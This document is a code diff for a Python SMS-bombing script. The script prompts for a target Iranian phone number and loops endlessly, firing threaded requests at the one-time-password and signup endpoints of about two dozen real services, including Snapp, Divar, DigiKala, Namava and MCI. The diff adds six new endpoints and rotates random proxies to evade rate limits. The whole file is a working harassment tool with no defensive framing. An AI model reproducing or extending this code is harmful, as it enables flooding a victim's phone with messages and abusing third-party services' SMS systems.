@@ -8,13 +8,19 @@ import requests
 from threading import Thread
 
 
+
+
+
 # Config
 config = open("config.py", "r").read()
 exec(config)
 
 
+
+
+
 # Clear
-os.system("cls" if os.name == "nt" else "clear")
+os.system("clear")
 
 
 
@@ -29,7 +35,7 @@ def snapp(phone):
         }
 
     try:
-        SnapRequest = requests.post("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", headers=SnappHeader, json=SnappData, proxies=proxy)
+        SnapRequest = requests.post("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", headers=SnappHeader, json=SnappData, proxies=random.choices(proxy_list)[0])
         if "OK" in SnapRequest.text:
             print(f"{green}True:  {white}Snapp{reset}")
         else:
@@ -46,7 +52,7 @@ def gap(phone):
     global GapHeader
 
     try:
-        GapRequest = requests.get("https://core.gap.im/v1/user/add.json?mobile=%2B{}".format(phone.split("+")[1]), headers=GapHeader, proxies=proxy)
+        GapRequest = requests.get("https://core.gap.im/v1/user/add.json?mobile=%2B{}".format(phone.split("+")[1]), headers=GapHeader, proxies=random.choices(proxy_list)[0])
         if "OK" in GapRequest.text:
             print(f"{green}True:  {white}Gap{reset}")
         else:
@@ -67,13 +73,17 @@ def tap30(phone):
         }
 
     try:
-        Tap30Request = requests.post("https://tap33.me/api/v2/user", headers=Tap30Header, json=Tap30Data, proxies=proxy)
+        Tap30Request = requests.post("https://tap33.me/api/v2/user", headers=Tap30Header, json=Tap30Data, proxies=random.choices(proxy_list)[0])
         if "OK" in Tap30Request.text:
             print(f"{green}True:  {white}Tap30{reset}")
         else:
             print(f"{red}False: {white}Tap30{reset}")
     except:
         print(f"{yellow}Can't send request")
+
+
+
+
 
 # Divar
 def divar(phone):
@@ -84,7 +94,7 @@ def divar(phone):
         }
 
     try:
-        DivarRequest = requests.post("https://api.divar.ir/v5/auth/authenticate", headers=DivarHeader, json=DivarData, proxies=proxy)
+        DivarRequest = requests.post("https://api.divar.ir/v5/auth/authenticate", headers=DivarHeader, json=DivarData, proxies=random.choices(proxy_list)[0])
         if "SENT" in DivarRequest.text:
             print(f"{green}True:  {white}Divar{reset}")
         else:
@@ -103,7 +113,7 @@ def bama(phone):
     BamaData = "cellNumber=0"+phone.split("+98")[1]
 
     try:
-        BamaRequest = requests.post("https://bama.ir/signin-send-otp", headers=BamaHeader, data=BamaData, proxies=proxy)
+        BamaRequest = requests.post("https://bama.ir/signin-send-otp", headers=BamaHeader, data=BamaData, proxies=random.choices(proxy_list)[0])
         if "0" in BamaRequest.text:
             print(f"{green}True:  {white}Bama{reset}")
         else:
@@ -124,7 +134,7 @@ def dedifood(phone):
         "country_id": 1
         }
     try:
-        DedifoodRequest = requests.post(DedifoodURL ,json=DedifoodData, proxies=proxy)
+        DedifoodRequest = requests.post(DedifoodURL ,json=DedifoodData, proxies=random.choices(proxy_list)[0])
         if "200" in str(DedifoodRequest):
             print(f"{green}True:  {white}Dedifood{reset}")
         else:
@@ -145,13 +155,14 @@ def behtarino(phone):
         "phone": "0" + phone.split("+98")[1]
         }
     try:
-        BehtarinoRequest = requests.post(BehtarinoURL, headers=BehtarinoHeader, json=BehtarinoData, proxies=proxy)
+        BehtarinoRequest = requests.post(BehtarinoURL, headers=BehtarinoHeader, json=BehtarinoData, proxies=random.choices(proxy_list)[0])
         if "200" in str(BehtarinoRequest):
             print(f"{green}True:  {white}Behtarino{reset}")
         else:
             print(f"{red}False: {white}Behtarino{reset}")
     except:
         print(f"{yellow}Can't send request")
+
 
 
 
@@ -164,7 +175,7 @@ def delino(phone):
         "mobile": "0" + phone.split("+98")[1]
         }
     try:
-        DelinoRequest = requests.post(DelinoURL, json=DelinoData, proxies=proxy)
+        DelinoRequest = requests.post(DelinoURL, json=DelinoData, proxies=random.choices(proxy_list)[0])
         if "200" in str(DelinoRequest):
             print(f"{green}True:  {white}Delino{reset}")
         else:
@@ -185,7 +196,7 @@ def zarinplus(phone):
         "phone_number": phone.split("+")[1]
         }
     try:
-        ZarinplusRequest = requests.post(ZarinplusURL, headers=ZarinplusHeader, json=ZarinplusData, proxies=proxy)
+        ZarinplusRequest = requests.post(ZarinplusURL, headers=ZarinplusHeader, json=ZarinplusData, proxies=random.choices(proxy_list)[0])
         if "200" in str(ZarinplusRequest):
             print(f"{green}True:  {white}Zarinplus{reset}")
         else:
@@ -209,7 +220,7 @@ def livito(phone):
         "grant_type": "password"
         }
     try:
-        LivitoRequest = requests.post(LivitoURL, headers=LivitoHeader, json=LivitoData, proxies=proxy)
+        LivitoRequest = requests.post(LivitoURL, headers=LivitoHeader, json=LivitoData, proxies=random.choices(proxy_list)[0])
         if "200" in str(LivitoRequest):
             print(f"{green}True:  {white}Livito{reset}")
         else:
@@ -232,7 +243,7 @@ def baarbaanet(phone):
         "viaEmail": False
         }
     try:
-        BaarbaanetRequest = requests.post(BaarbaanetURL, headers=BaarbaanetHeader, json=BaarbaanetData, proxies=proxy)
+        BaarbaanetRequest = requests.post(BaarbaanetURL, headers=BaarbaanetHeader, json=BaarbaanetData, proxies=random.choices(proxy_list)[0])
         if "200" in str(BaarbaanetRequest):
             print(f"{green}True:  {white}Baarbaanet{reset}")
         else:
@@ -255,13 +266,14 @@ def bornosmode(phone):
 
         }
     try:
-        BornosRequest = requests.post(BornosURL, headers=BornosHeader, json=BornosData, proxies=proxy)
+        BornosRequest = requests.post(BornosURL, headers=BornosHeader, json=BornosData, proxies=random.choices(proxy_list)[0])
         if "200" in str(BornosRequest):
             print(f"{green}True:  {white}Bornos{reset}")
         else:
             print(f"{red}False: {white}Bornos{reset}")
     except:
         print(f"{yellow}Can't send request")
+
 
 
 
@@ -275,7 +287,7 @@ def komodaa(phone):
         "phone_number": "0" + phone.split("+98")[1]
         }
     try:
-        KomodaaRequest = requests.post(KomodaaURL, headers=KomodaHeader, json=KomodaaData, proxies=proxy)
+        KomodaaRequest = requests.post(KomodaaURL, headers=KomodaHeader, json=KomodaaData, proxies=random.choices(proxy_list)[0])
         if "200" in str(KomodaaRequest):
             print(f"{green}True:  {white}Komodaa{reset}")
         else:
@@ -286,8 +298,6 @@ def komodaa(phone):
 
 
 
-
-#====================# New APIs #===================#
 
 # DigiKala
 def digikala(phone):
@@ -300,7 +310,7 @@ def digikala(phone):
         "otp_call": False
     }
     try:
-        DigiKalaRequest = requests.post(DigiKalaURl, headers=DigiKalaHeader, json=DigiKalaData, proxies=proxy)
+        DigiKalaRequest = requests.post(DigiKalaURl, headers=DigiKalaHeader, json=DigiKalaData, proxies=random.choices(proxy_list)[0])
         if "200" in str(DigiKalaRequest):
             print(f"{green}True:  {white}DigiKala{reset}")
         else:
@@ -321,7 +331,7 @@ def alibaba(phone):
         "phoneNumber": phone.split("+98")[1]
     }
     try:
-        AlibabaRequest = requests.post(AlibabaURL, headers=AlibabaHeader, json=AlibabaData, proxies=proxy)
+        AlibabaRequest = requests.post(AlibabaURL, headers=AlibabaHeader, json=AlibabaData, proxies=random.choices(proxy_list)[0])
         if "200" in str(AlibabaRequest):
             print(f"{green}True:  {white}Alibaba{reset}")
         else:
@@ -342,7 +352,7 @@ def sheypoor(phone):
         "username": "0" + phone.split("+98")[1]
     }
     try:
-        SheypoorRequest = requests.post(SheypoorURL, headers=SheypoorHeader, json=SheypoorData, proxies=proxy)
+        SheypoorRequest = requests.post(SheypoorURL, headers=SheypoorHeader, json=SheypoorData, proxies=random.choices(proxy_list)[0])
         if "200" in str(SheypoorRequest):
             print(f"{green}True:  {white}Sheypoor{reset}")
         else:
@@ -354,13 +364,144 @@ def sheypoor(phone):
 
 
 
+#====================# New APIs #===================#
+
+# Esam
+def esam(phone):
+    global EsamHeader
+
+    EsamURL = "https://api.esam.ir/api/account/RegisterOrLogin"
+    EsamData = {
+        "mobile": "0" + phone.split("+98")[1],
+        "present_type": "WebApp",
+        "registration_method": 0,
+        "serialNumber": "React1234"
+    }
+    try:
+        EsamRequest = requests.post(EsamURL, headers=EsamHeader, json=EsamData, proxies=random.choices(proxy_list)[0])
+        if "200" in str(EsamRequest):
+            print(f"{green}True:  {white}Esam{reset}")
+        else:
+            print(f"{red}False: {white}Esam{reset}")
+    except:
+        print(f"{yellow}Can't send request")
+
+
+
+
+
+# Namava
+def namava(phone):
+    global NamavaHeader
+
+    NamavaURL = "https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request"
+    NamavaData = {
+        "UserName": phone
+    }
+    try:
+        NamavaRequest = requests.post(NamavaURL, headers=NamavaHeader, json=NamavaData, proxies=random.choices(proxy_list)[0])
+        if "200" in str(NamavaRequest):
+            print(f"{green}True:  {white}Namava{reset}")
+        else:
+            print(f"{red}False: {white}Namava{reset}")
+    except:
+        print(f"{yellow}Can't send request")
+
+
+
+
+
+# MyMCI
+def mymci(phone):
+    global MyMCIHeader
+
+    MyMCIURL = "https://api-ebcom.mci.ir/services/auth/v1.0/otp"
+    MyMCIData = {
+        "msisdn": phone.split("+98")[1]
+    }
+    try:
+        MyMCIRequest = requests.post(MyMCIURL, headers=MyMCIHeader, json=MyMCIData, proxies=random.choices(proxy_list)[0])
+        if "200" in str(MyMCIRequest):
+            print(f"{green}True:  {white}MyMCI{reset}")
+        else:
+            print(f"{red}False: {white}MyMCI{reset}")
+    except:
+        print(f"{yellow}Can't send request")
+
+
+
+
+
+# tgju
+def tgju(phone):
+    global tgjuHeader
+
+    tgjuURL = "https://dashboard-api.accessban.com/v1/auth/init"
+    tgjuData = {
+        "mobile": "0" + phone.split("+98")[1]
+    }
+    # Do not works with Header
+    try:
+        tgjuRequest = requests.post(tgjuURL, json=tgjuData, proxies=random.choices(proxy_list)[0])
+        if "200" in str(tgjuRequest):
+            print(f"{green}True:  {white}TGUI{reset}")
+        else:
+            print(f"{red}False: {white}TGUI{reset}")
+    except:
+        print(f"{yellow}Can't send request")
+
+
+
+
+
+# Torob
+def torob(phone):
+    global TorobHeader
+
+    new_phone = "0" + phone.split("+98")[1]
+    TorobURL = f"https://api.torob.com/v4/user/phone/send-pin/?phone_number={new_phone}"
+    try:
+        TorobRequest = requests.get(TorobURL, headers=TorobHeader, proxies=random.choices(proxy_list)[0])
+        if "200" in str(TorobRequest):
+            print(f"{green}True:  {white}Torob{reset}")
+        else:
+            print(f"{red}False: {white}Torob{reset}")
+    except:
+        print(f"{yellow}Can't send request")
+
+
+
+
+
+# TelWebion
+def telwebion(phone):
+    global TelWebionHeader
+
+    TelWebionURL = "https://gateway.telewebion.com/shenaseh/api/v2/auth/step-one?isForeign=true"
+    TelWebionData = {
+        "phone": phone.split("+98")[1],
+        "code": "98",
+        "smsStatus": "default"
+    }
+    try:
+        TelWebionRequest = requests.post(TelWebionURL, headers=TelWebionHeader, json=TelWebionData, proxies=random.choices(proxy_list)[0])
+        if "200" in str(TelWebionRequest):
+            print(f"{green}True:  {white}TelWebion{reset}")
+        else:
+            print(f"{red}False: {white}TelWebion{reset}")
+    except:
+        print(f"{yellow}Can't send request")
+
+
+
+
 
 # Main
 def main():
     global logo
 
     print(logo)
-    text = f"{cyan}Enter target (+98xxxxxxxxxx) : {reset}" 
+    text = f"{blue}Enter target (+98xxxxxxxxxx) : {reset}" 
     for char in text:
         sys.stdout.write(char)
         sys.stdout.flush()
@@ -369,7 +510,7 @@ def main():
     phone = input()
 
     if len(phone) == 13:    
-        print (f"{purple}Spam Started!{reset}\n{purple}Hit {white}ctrl+c{purple} or {white}ctrl+z {purple}to exit!")
+        print (f"{blue}Spam Started!{reset}\n{blue}Hit {white}ctrl+c{blue} or {white}ctrl+z {blue}to exit!\n")
 
         while True:
             Thread(target=snapp, args=[phone]).start()         # Snapp
@@ -398,9 +539,6 @@ def main():
             time.sleep(0.5)
             Thread(target=komodaa, args=[phone]).start()       # Komodaa
             time.sleep(0.5) 
-
-        #=====# New APIs #=====#
-
             Thread(target=digikala, args=[phone]).start()      # DigiKala
             time.sleep(0.5)
             Thread(target=alibaba, args=[phone]).start()       # Alibaba
@@ -408,6 +546,20 @@ def main():
             Thread(target=sheypoor, args=[phone]).start()      # Sheypoor
             time.sleep(0.5) 
 
+            #=====# New APIs #=====#
+
+            Thread(target=esam, args=[phone]).start()          # Esam
+            time.sleep(0.5)
+            Thread(target=namava, args=[phone]).start()        # Namava
+            time.sleep(0.5)
+            Thread(target=mymci, args=[phone]).start()         # MyMCI
+            time.sleep(0.5) 
+            Thread(target=tgju, args=[phone]).start()          # tgju
+            time.sleep(0.5)
+            Thread(target=torob, args=[phone]).start()         # Torob
+            time.sleep(0.5)        
+            Thread(target=telwebion, args=[phone]).start()     # TelWebion
+            time.sleep(0.5) 
 
     else:
         error = f"{white}Error: {red}Invalid number entered!"
